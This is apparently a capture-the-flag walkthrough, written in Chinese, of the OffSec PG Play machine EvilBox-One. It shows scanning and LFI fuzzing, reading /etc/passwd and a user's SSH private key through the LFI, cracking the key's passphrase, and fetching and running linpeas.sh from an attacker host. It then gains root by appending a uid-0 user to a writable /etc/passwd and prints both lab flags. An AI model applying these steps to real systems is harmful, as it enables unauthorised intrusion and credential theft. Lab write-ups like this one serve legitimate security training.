###### tags: `Offsec` `PG Play` `Easy` `Linux`

# EvilBox-One
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.220.212 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.220.212:22
Open 192.168.220.212:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsg5B3Ae75r4szTNFqG247Ea8vKjxulITlFGE9YEK4KLJA86TskXQn9E24yX4cYMoF0WDn7JD782HfHCrV74r8nU2kVTw5Y8ZRyBEqDwk6vmOzMvq1Kzrcj+i4f17saErC9YVgx5/33e7UkLXt3MYVjVPIekf/sxWxS4b6N0+J1xiISNcoL/kmG3L7McJzX6Qx6cWtauJf3HOxNtZJ94WetHArSpUyIsn83P+Quxa/uaUgGPx4EkHL7Qx3AVIBbKA7uDet/pZUchcPq/4gv25DKJH4XIty+5/yNQo1EMd6Ra5A9SmnhWjSxdFqTGHpdKnyYHr4VeZ7cpvpQnoiV4y9
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJdleEd7RFnYXv0fbc4pC3l/OWWVAe8GNgoY3hK3C5tlUCvQF+LUFKqe5esCmzIkA8pvpNwEqxC8I2E5XjUtIBo=
|   256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqX8NlpHPg67roxI6Xi8VzNZqC5Uj9KHdAnOcD6/q5/
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`ffuf`掃
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.220.212/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

secret                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 63ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 63ms]
:: Progress: [87664/87664] :: Job [1/1] :: 47 req/sec :: Duration: [0:03:20] :: Errors: 0 ::
```

再掃，加個`.php`看看
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.220.212/secret/FUZZ.php -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

evil                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 68ms]
                        [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 64ms]
:: Progress: [87664/87664] :: Job [1/1] :: 20 req/sec :: Duration: [0:03:12] :: Errors: 0 ::
```

後來再進去看啥都沒，試試看`LFI`掃描
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.220.212/secret/evil.php?FUZZ=/etc/passwd -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fw 1

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 67ms]
:: Progress: [220560/220560] :: Job [1/1] :: 287 req/sec :: Duration: [0:07:34] :: Errors: 0 ::
```

前往`http://192.168.220.212/secret/evil.php?command=/etc/passwd`可以看到東西了

![EvilBox-One_1.png](picture/EvilBox-One_1.png)

嘗試前往`/home/mowree/.ssh/id_rsa`看能不能看到`mowree`的key
`http://192.168.220.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa`

![EvilBox-One_2.png](picture/EvilBox-One_2.png)

把格式整理好
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

利用`ssh2john`爆破可以得密碼`unicorn`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh2john id_rsa > mowree.hash 

┌──(kali㉿kali)-[~/pgplay]
└─$ john --wordlist=/home/kali/rockyou.txt mowree.hash

unicorn          (id_rsa)
```

登入`mowree`之後在`/home/mowree`可得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/pgplay]
└─$ ssh -i id_rsa mowree@192.168.220.212 

Enter passphrase for key 'id_rsa': unicorn

mowree@EvilBoxOne:~$ cat local.txt
3671804c1ea3d1ad2a0613dd76297df2
```

用`linpeas.sh`
```
mowree@EvilBoxOne:~$ wget 192.168.45.227/linpeas.sh
mowree@EvilBoxOne:~$ chmod +x linpeas.sh
mowree@EvilBoxOne:~$ ./linpeas.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                         
                              
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable           
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No                                 
═╣ Can I read shadow plists? ............ No                                 
═╣ Can I write shadow plists? ........... No                                 
═╣ Can I read opasswd file? ............. No                                 
═╣ Can I write in network-scripts? ...... No                                 
═╣ Can I read root folder? .............. No 
```

把root寫入`/etc/passwd`，切成`toor`就可在/root得proof.txt
```
mowree@EvilBoxOne:~$ echo "toor:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

mowree@EvilBoxOne:~$ su toor
Contraseña: 
root@EvilBoxOne:~# cat proof.txt
a014395862122d3cbb7eef68b50302a3
```